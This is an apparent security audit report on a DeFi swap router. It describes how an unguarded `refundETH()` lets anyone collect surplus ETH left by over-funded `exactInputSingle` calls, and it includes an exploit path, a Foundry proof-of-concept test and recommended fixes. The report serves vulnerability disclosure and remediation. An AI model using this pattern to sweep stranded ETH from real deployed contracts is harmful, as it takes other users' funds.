Audit Report

## Title
Unguarded `refundETH()` allows any caller to drain stranded native ETH left by excess-value swap calls — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

## Summary
`refundETH()` transfers the router's entire native ETH balance to `msg.sender` with no check that the caller is the original depositor. When a user calls `exactInputSingle` (or any other payable swap entry point) with `msg.value` exceeding `amountIn`, the `pay()` helper wraps only the exact required amount and leaves the surplus as native ETH on the router. Any attacker can then call `refundETH()` in a separate transaction to steal that surplus ETH.

## Finding Description
`refundETH()` is implemented with no access control: [1](#0-0) 

Inside the swap callback, `pay()` wraps only exactly `value` ETH when `token == WETH` and `nativeBalance >= value`, leaving any surplus as native ETH on the router: [2](#0-1) 

`exactInputSingle` is `external payable` and performs no automatic refund after the swap completes — it only checks `amountOutMinimum` and clears the callback context: [3](#0-2) 

The `receive()` guard (only WETH can push ETH) does not prevent ETH from arriving via the `payable` function call itself: [4](#0-3) 

The intended safe pattern — confirmed by the existing test — is to bundle the swap with `refundETH()` inside a `multicall`. However, `exactInputSingle` is a standalone `payable` function that any caller can invoke directly with excess ETH, and the contract provides no protection against that: [5](#0-4) 

**Exploit path:**
1. User calls `exactInputSingle{value: 2 ether}` with `amountIn = 1 ether` and `tokenIn = WETH`.
2. In the swap callback, `pay()` wraps exactly 1 ETH and transfers WETH to the pool; the remaining 1 ETH stays on the router.
3. `exactInputSingle` returns without refunding the surplus.
4. Attacker calls `refundETH()` in a separate transaction and receives the 1 ETH.

## Impact Explanation
Direct loss of user ETH principal. A user who calls `exactInputSingle{value: 2 ether}` with `amountIn = 1 ether` loses the surplus 1 ETH to any attacker who front-runs or back-runs with a `refundETH()` call. The attacker needs no special privileges, no approvals, and no capital. This is a Critical/High direct loss of user principal above Sherlock thresholds.

## Likelihood Explanation
Any user who calls a payable swap function directly without wrapping in `multicall` + `refundETH()` is vulnerable. The function signature accepts `msg.value` with no warning, and the contract silently retains the surplus. MEV bots routinely monitor for stranded ETH on router contracts and will extract it within the same block. The `test_mixedNativeAndWeth_exactInputSingle_wethForToken` test (lines 41–70) demonstrates a legitimate direct call pattern with `msg.value < amountIn`, showing users are expected to call these functions directly. [6](#0-5) 

## Recommendation
Two complementary fixes:

1. **Automatic refund at swap exit**: at the end of `exactInputSingle`, `exactInput`, `exactOutputSingle`, and `exactOutput`, refund any remaining `address(this).balance` to `msg.sender`.
2. **Restrict `refundETH()` to the original payer**: record the payer in transient storage at the start of each payable entry point and require `msg.sender == storedPayer` inside `refundETH()`. This mirrors the existing transient-storage pattern already used for the callback payer context.

## Proof of Concept
```solidity
function test_attacker_steals_stranded_eth() public {
    address user    = makeAddr("user");
    address attacker = makeAddr("attacker");
    vm.deal(user, 2 ether);

    vm.prank(user);
    router.exactInputSingle{value: 2 ether}(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountIn: 1 ether,
            amountOutMinimum: 0,
            recipient: user,
            deadline: block.timestamp + 1,
            priceLimitX64: 0,
            extensionData: ""
        })
    );

    assertEq(address(router).balance, 1 ether); // 1 ETH stranded

    vm.prank(attacker);
    router.refundETH();

    assertEq(attacker.balance, 1 ether, "attacker stole user ETH");
    assertEq(user.balance,     0,       "user received nothing");
}
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L58-63)
```text
  function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      _transferETH(msg.sender, balance);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L75-77)
```text
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-86)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
    int128 out = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    amountOut = MetricOmmSwapInputs.int128ToUint128(out);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```

**File:** metric-periphery/test/MetricOmmSimpleRouter.native.t.sol (L41-70)
```text
  function test_mixedNativeAndWeth_exactInputSingle_wethForToken() public {
    uint128 amountIn = 2_500;
    uint256 nativePart = amountIn / 2;
    uint256 wethPart = amountIn - nativePart;

    uint256 token1Before = token1.balanceOf(recipient);
    uint256 swapperEthBefore = swapper.balance;
    uint256 swapperWethBefore = weth.balanceOf(swapper);

    vm.prank(swapper);
    router.exactInputSingle{value: nativePart}(
      IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: recipient,
        deadline: _deadline(),
        priceLimitX64: 0,
        extensionData: ""
      })
    );

    assertGt(token1.balanceOf(recipient) - token1Before, 0, "recipient token1");
    assertEq(swapperEthBefore - swapper.balance, nativePart, "swapper native spent");
    assertEq(swapperWethBefore - weth.balanceOf(swapper), wethPart, "swapper weth spent");
    _assertRouterEmpty();
  }
```

**File:** metric-periphery/test/MetricOmmSimpleRouter.native.t.sol (L106-133)
```text
  function test_multicall_ethInput_exactInputSingle_refundsUnusedEth() public {
    uint128 amountIn = 1_000;
    uint256 msgValue = 2 ether;
    uint256 swapperEthBefore = swapper.balance;

    vm.prank(swapper);
    bytes[] memory calls = new bytes[](2);
    calls[0] = abi.encodeWithSelector(
      router.exactInputSingle.selector,
      IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: recipient,
        deadline: _deadline(),
        priceLimitX64: 0,
        extensionData: ""
      })
    );
    calls[1] = abi.encodeWithSelector(router.refundETH.selector);
    router.multicall{value: msgValue}(calls);

    assertEq(swapper.balance, swapperEthBefore - amountIn, "unused eth refunded");
    _assertRouterEmpty();
  }
```
